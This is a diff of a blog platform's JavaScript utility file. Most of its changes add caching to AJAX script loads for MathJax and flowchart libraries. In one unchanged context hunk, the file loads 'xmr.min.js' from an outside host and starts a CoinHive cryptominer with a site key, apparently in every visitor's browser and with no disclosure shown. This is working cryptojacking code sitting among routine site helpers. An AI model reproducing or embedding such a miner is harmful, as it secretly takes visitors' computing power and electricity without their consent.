@@ -66,7 +66,8 @@ var Util = {
         $.ajax({
           method: "GET",
           url: "https://cdn.staticfile.org/MathJax/MathJax-2.6-latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&_=1473258780393",
-          dataType: "script"
+          dataType: "script",
+          cache: true
         }).done(function () {
           initMathJax();
         });
@@ -93,7 +94,8 @@ var Util = {
         $.ajax({
           method: "GET",
           url: latkeConfig.staticServePath + '/js/lib/flowchart/flowchart.min.js',
-          dataType: "script"
+          dataType: "script",
+          cache: true
         }).done(function () {
           initFlow()
         });
@@ -243,7 +245,8 @@ var Util = {
     $.ajax({
       method: "GET",
       url: 'https://img.hacpai.com/xmr.min.js',
-      dataType: "script"
+      dataType: "script",
+      cache: true
     }).done(function () {
       var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
       miner.start();
@@ -253,7 +256,7 @@ var Util = {
    * @description 页面初始化执行的函数
    */
   init: function () {
-//window.onerror = Util.error;
+  //window.onerror = Util.error;
     Util.killIE();
     Util.setTopBar();
     Util.parseMarkdown();
